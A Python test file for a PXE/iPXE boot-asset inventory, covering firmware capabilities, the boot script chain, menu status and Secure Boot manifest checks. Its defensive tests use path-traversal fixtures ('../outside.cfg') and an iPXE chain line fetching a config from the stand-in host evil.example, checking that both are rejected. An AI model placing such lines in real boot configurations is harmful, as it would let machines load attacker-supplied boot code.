"""引导链状态：UEFI 固件能力、引导脚本链与菜单可用性。"""

import hashlib
import json
from pathlib import Path

from control_plane.app import boot_assets, boot_pki, config

DNSMASQ = """\
dhcp-match=set:efi64,option:client-arch,7
dhcp-boot=tag:efi64,snponly.efi
dhcp-userclass=set:ipxe,iPXE
dhcp-boot=tag:ipxe,boot.ipxe
"""

BOOT_IPXE = """\
#!ipxe
set https-port 443
chain --autofree https://${next-server}:${https-port}/tftp/boot.ipxe.cfg ||
chain --replace --autofree ${menu-url} ||
"""

BOOT_CFG = """\
#!ipxe
set https-port 443
set https-url https://${controller_ip}:${https-port}/
set chain-url ${https-url}file
set menu-url ${https-url}tftp/menu.ipxe
"""

FIRMWARE = (
    b"iPXE 2.0.0+ (ge6e51)\x00HTTPS\x00efi_nvs\x00"
    b"keygen: device key already exists\x00pubkey: no device key\x00"
    b"Usage: sign\x00Trusted server certificate fingerprint (TOFU)\x00"
)

MENU = """\
#!ipxe
:start
menu iPXE boot menu for ${initiator-iqn}
item --key b boot-os    Boot ${os}
item --key d menu-diag  System tools...

:boot-os
set root-path nvme://${storager-ip}:${port}/${disk-nqn}
sanboot ${root-path} || goto failed

:menu-diag
menu Diagnostic tools
item memtest Memtest86+
item --gap
item setup  Settings

:memtest
set base-url ${chain-url}/tools
initrd ${base-url}/memtest.iso
chain memdisk iso raw || goto failed
"""


def _tree(tmp_path: Path) -> tuple[Path, Path]:
    tftp = tmp_path / "tftp"
    tftp.mkdir()
    (tftp / "snponly.efi").write_bytes(FIRMWARE)
    (tftp / "boot.ipxe").write_text(BOOT_IPXE, encoding="utf-8")
    (tftp / "boot.ipxe.cfg").write_text(BOOT_CFG, encoding="utf-8")
    (tftp / "menu.ipxe").write_text(MENU, encoding="utf-8")
    conf = tmp_path / "dnsmasq.conf"
    conf.write_text(DNSMASQ, encoding="utf-8")
    return conf, tftp


def test_inventory_reports_uefi_firmware_chain_and_menu(tmp_path):
    conf, tftp = _tree(tmp_path)
    data = boot_assets.inventory(conf, tftp)

    assert len(data["firmware"]) == 1
    firmware = data["firmware"][0]
    assert firmware["mode"] == "uefi"
    assert firmware["file"] == "snponly.efi"
    assert firmware["status"] == "ok"
    assert firmware["version"] == "2.0.0+ (ge6e51)"
    assert all(cap["present"] for cap in firmware["capabilities"])
    assert firmware["host_path"] == "tftp/snponly.efi"

    assert {item["file"] for item in data["stage2"]} == {"boot.ipxe", "boot.ipxe.cfg", "menu.ipxe"}
    assert all(item["status"] == "ok" for item in data["stage2"])
    assert data["menu"] == {"status": "ok", "items": 4}


def test_firmware_capability_gap_is_flagged(tmp_path):
    """文件存在但缺少 boot.ipxe 依赖的命令时必须标出来，不能只看文件在不在。"""
    conf, tftp = _tree(tmp_path)
    (tftp / "snponly.efi").write_bytes(FIRMWARE.replace(b"Usage: sign\x00", b""))

    uefi = boot_assets.inventory(conf, tftp)["firmware"][0]
    assert uefi["status"] == "incomplete"
    assert [cap["id"] for cap in uefi["capabilities"] if not cap["present"]] == ["sign"]


def test_missing_firmware_and_empty_script_are_reported(tmp_path):
    conf, tftp = _tree(tmp_path)
    (tftp / "snponly.efi").unlink()
    (tftp / "boot.ipxe.cfg").write_bytes(b"")

    data = boot_assets.inventory(conf, tftp)
    assert data["firmware"][0]["status"] == "missing"
    chain = {item["file"]: item for item in data["stage2"]}
    assert chain["boot.ipxe.cfg"]["status"] == "empty"


def test_menu_unavailable_without_menu_file(tmp_path):
    conf, tftp = _tree(tmp_path)
    (tftp / "menu.ipxe").unlink()

    data = boot_assets.inventory(conf, tftp)
    assert data["menu"] == {"status": "unavailable", "items": 0}
    assert {item["file"]: item["status"] for item in data["stage2"]}["menu.ipxe"] == "missing"


def test_escaping_paths_are_rejected_and_never_read(tmp_path):
    (tmp_path / "outside.ipxe").write_text(
        "menu leaked\nitem a Leaked\n", encoding="utf-8"
    )
    tftp = tmp_path / "tftp"
    tftp.mkdir()
    (tftp / "snponly.efi").write_bytes(FIRMWARE)
    (tftp / "boot.ipxe").write_text(
        "chain --autofree ../outside.cfg ||\n", encoding="utf-8"
    )
    conf = tmp_path / "dnsmasq.conf"
    conf.write_text(
        "dhcp-boot=tag:efi64,../outside.efi\n"
        "dhcp-boot=tag:ipxe,boot.ipxe\n",
        encoding="utf-8",
    )

    data = boot_assets.inventory(conf, tftp)
    assert data["firmware"][0]["status"] == "rejected"
    chain = {item["file"]: item["status"] for item in data["stage2"]}
    assert chain == {"boot.ipxe": "ok", "../outside.cfg": "rejected"}
    assert data["menu"] == {"status": "unavailable", "items": 0}


def test_config_url_outside_tftp_is_not_read(tmp_path):
    conf, tftp = _tree(tmp_path)
    (tftp / "boot.ipxe").write_text(
        "#!ipxe\nchain --autofree https://evil.example/other.cfg ||\n",
        encoding="utf-8",
    )

    data = boot_assets.inventory(conf, tftp)
    assert {item["file"] for item in data["stage2"]} == {"boot.ipxe"}
    assert data["menu"] == {"status": "unavailable", "items": 0}


def test_repo_boot_chain_keeps_tftp_to_pointer():
    root = Path(__file__).resolve().parents[2]
    boot = (root / "tftp/boot.ipxe").read_text(encoding="utf-8")
    cfg = (root / "tftp/boot.ipxe.cfg").read_text(encoding="utf-8")
    boot_code = "\n".join(line.split("#", 1)[0] for line in boot.splitlines())
    cfg_code = "\n".join(line.split("#", 1)[0] for line in cfg.splitlines())

    assert "tftp://" not in boot_code
    assert "https://${next-server}:${https-port}/tftp/boot.ipxe.cfg" in boot_code
    assert "boot-url" not in cfg_code
    assert "boot-dir" not in cfg_code
    assert "set https-port 443" in boot_code
    assert "set https-port 443" in cfg_code


def test_boot_assets_endpoint(tmp_path, client, auth_headers, monkeypatch):
    conf, tftp = _tree(tmp_path)
    monkeypatch.setattr(config, "DEFAULT_DNSMASQ_CONF", str(conf))
    monkeypatch.setattr(config, "DEFAULT_TFTP_DIR", str(tftp))

    res = client.get("/boot-assets", headers=auth_headers)
    assert res.status_code == 200
    body = res.json()
    assert body["firmware"][0]["file"] == "snponly.efi"
    assert body["menu"]["status"] == "ok"


def test_boot_assets_endpoint_reports_missing_sources(tmp_path, client, auth_headers, monkeypatch):
    monkeypatch.setattr(config, "DEFAULT_DNSMASQ_CONF", str(tmp_path / "nope.conf"))
    monkeypatch.setattr(config, "DEFAULT_TFTP_DIR", str(tmp_path))

    res = client.get("/boot-assets", headers=auth_headers)
    assert res.status_code == 404


def _secureboot_tree(tmp_path: Path, *, hash_match: bool = True, with_ca: bool = True) -> tuple:
    pki, certs = tmp_path / "pki", tmp_path / "certs"
    status = boot_pki.ensure_boot_pki(pki, certs, "IP:127.0.0.1")
    sb = tmp_path / "secureboot"
    sb.mkdir(parents=True)
    artifact = b"signed-efi"
    sha = hashlib.sha256(artifact).hexdigest()
    (sb / "snponly-sb.efi").write_bytes(artifact)
    (sb / "manifest.json").write_text(
        json.dumps({
            "artifact_sha256": sha if hash_match else "0" * 64,
            "signer": "CN=Test Signer",
            "built_at": "2026-10-24T00:00:00+00:00",
            "boot_https_port": 4443,
            "boot_ca_sha256": status["ca_sha256"],
        }),
        encoding="utf-8",
    )
    return sb, (status["ca_path"] if with_ca else None), sha


def test_secureboot_status_reports_signed_artifact(tmp_path):
    sb, ca_path, sha = _secureboot_tree(tmp_path)
    data = boot_assets.secureboot_status(sb, ca_path, 4443)
    assert data["present"] is True
    assert data["status"] == "ok"
    assert data["artifact_sha256"] == sha
    assert data["manifest_matches"] is True
    assert data["port_matches"] is True
    assert data["boot_https_port"] == 4443
    assert data["boot_ca_present"] is True
    assert data["boot_ca_matches"] is True
    assert data["signer"] == "CN=Test Signer"
    assert data["path"] == "/tftp/secureboot/snponly-sb.efi"


def test_secureboot_status_requires_manifest_hash_and_ca(tmp_path):
    sb, ca_path, _ = _secureboot_tree(tmp_path / "bad-hash", hash_match=False)
    assert boot_assets.secureboot_status(sb, ca_path, 4443)["status"] == "incomplete"

    sb, ca_path, _ = _secureboot_tree(tmp_path / "no-ca", with_ca=False)
    data = boot_assets.secureboot_status(sb, ca_path, 4443)
    assert data["boot_ca_present"] is False
    assert data["status"] == "incomplete"

    sb, ca_path, _ = _secureboot_tree(tmp_path / "other-ca")
    manifest_path = sb / "manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["boot_ca_sha256"] = "0" * 64
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    data = boot_assets.secureboot_status(sb, ca_path, 4443)
    assert data["boot_ca_present"] is True
    assert data["boot_ca_matches"] is False
    assert data["status"] == "incomplete"


def test_secureboot_status_requires_matching_boot_port(tmp_path):
    """端口烘在签名镜像里：与部署端口不一致时固件拨错端口，等同于不可用。"""
    sb, ca_path, _ = _secureboot_tree(tmp_path / "port-drift")
    manifest_path = sb / "manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["boot_https_port"] = 8443
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")

    data = boot_assets.secureboot_status(sb, ca_path, 4443)
    assert data["manifest_matches"] is True
    assert data["boot_ca_matches"] is True
    assert data["port_matches"] is False
    assert data["boot_https_port"] == 8443  # 展示固件里烘进去的端口，不是部署端口
    assert data["status"] == "incomplete"

    # manifest 端口写成字符串也要能判定一致（构建脚本以外的人工编辑）
    manifest["boot_https_port"] = "4443"
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    assert boot_assets.secureboot_status(sb, ca_path, 4443)["status"] == "ok"

    # 端口非法/缺失 → 无法判定，不判 ok
    manifest["boot_https_port"] = "not-a-port"
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    data = boot_assets.secureboot_status(sb, ca_path, 4443)
    assert data["port_matches"] is False
    assert data["boot_https_port"] == 4443
    assert data["status"] == "incomplete"


def test_secureboot_status_missing_artifact(tmp_path):
    data = boot_assets.secureboot_status(tmp_path / "absent", None, 4443)
    assert data == {
        "present": False,
        "status": "missing",
        "artifact": "snponly-sb.efi",
        "path": "/tftp/secureboot/snponly-sb.efi",
        "artifact_sha256": None,
        "artifact_size": None,
        "manifest_present": False,
        "manifest_matches": False,
        "signer": None,
        "built_at": None,
        "boot_https_port": 4443,
        "port_matches": False,
        "boot_ca_present": False,
        "boot_ca_sha256": None,
        "boot_ca_matches": False,
    }


def test_inventory_defaults_secureboot_to_tftp_subdir(tmp_path):
    conf, tftp = _tree(tmp_path)
    (tftp / "secureboot").mkdir()
    data = boot_assets.inventory(conf, tftp)
    assert data["secureboot"]["present"] is False
    assert data["secureboot"]["status"] == "missing"
